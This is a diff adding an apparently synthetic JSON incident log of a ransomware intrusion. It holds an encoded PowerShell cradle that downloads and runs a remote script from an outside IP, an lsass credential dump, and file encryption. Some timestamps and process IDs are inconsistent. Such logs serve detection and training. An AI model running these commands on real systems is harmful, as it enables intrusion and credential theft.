@@ -1,0 +1,48 @@
+{
+  "incident_name": "Multi-Stage BlackCat Ransomware Intrusion",
+  "target_asset": "FIN-WS-04",
+  "events": [
+    {
+      "EventID": 1,
+      "UtcTime": "2026-10-14 02:14:10.120",
+      "ProcessId": 4120,
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vNDUuMzMuMzIuMTU2L3N0YWdlMl9wYXlsb2FkLnBzMScp",
+      "ParentProcessId": 1844,
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "User": "CORP\\finance_user",
+      "Computer": "FIN-WS-04",
+      "Hashes": "SHA256=9F83C60A9202513F412497D3A04917F694E976FB7B105A30E8C89495B214878A,MD5=8B3F5C3E2D1A4F5E6B7C8D9E0F1A2B3C"
+    },
+    {
+      "ts": "1710403250.000",
+      "id.orig_h": "10.0.4.15",
+      "id.orig_p": 49812,
+      "id.resp_h": "45.33.32.156",
+      "id.resp_p": 443,
+      "proto": "tcp",
+      "service": "ssl",
+      "server_name": "c2.threat-actor-infra.xyz",
+      "conn_state": "SF"
+    },
+    {
+      "EventID": 10,
+      "UtcTime": "2026-10-14 02:15:22.450",
+      "SourceProcessId": 4120,
+      "SourceImage": "C:\\Users\\finance_user\\AppData\\Local\\Temp\\procdump.exe",
+      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+      "GrantedAccess": "0x1FFFFF",
+      "Computer": "FIN-WS-04",
+      "User": "CORP\\finance_user"
+    },
+    {
+      "EventID": 11,
+      "UtcTime": "2026-10-14 02:16:05.100",
+      "ProcessId": 4120,
+      "Image": "C:\\Users\\finance_user\\AppData\\Local\\Temp\\locker.exe",
+      "TargetFilename": "C:\\Users\\finance_user\\Documents\\Q3_Financial_Audit.xlsx.locked",
+      "Computer": "FIN-WS-04",
+      "User": "CORP\\finance_user"
+    }
+  ]
+}
